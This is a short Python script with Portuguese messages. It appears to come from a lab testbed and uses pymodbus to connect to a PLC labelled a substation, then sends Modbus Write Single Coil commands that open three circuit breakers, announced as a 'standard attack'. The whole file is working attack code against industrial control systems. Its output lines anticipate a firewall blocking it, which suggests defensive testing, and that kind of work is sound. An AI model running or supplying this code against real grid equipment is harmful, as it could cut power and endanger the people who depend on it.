import time
from pymodbus.client import ModbusTcpClient

PLC_IP = "172.28.0.10"
client = ModbusTcpClient(PLC_IP, port=502)

print(f"[*] Conectando à Subestação ({PLC_IP}:502)...")
if not client.connect():
    print("[-] Falha na conexão! O Firewall bloqueou o acesso.")
    exit(1)

print("[!] Disparando ataque padrão: Modbus Write Single Coil (Function Code 05)...")
for i in range(3):
    print(f"    -> Abrindo Disjuntor 0{i+1} (Coil {i})...")
    res = client.write_coil(i, False)
    if res.isError():
        print(f"    [X] Pacote bloqueado ou recusado no Disjuntor 0{i+1}!")
    else:
        print(f"    [+] Disjuntor 0{i+1} DESLIGADO com sucesso!")
    time.sleep(1)

client.close()
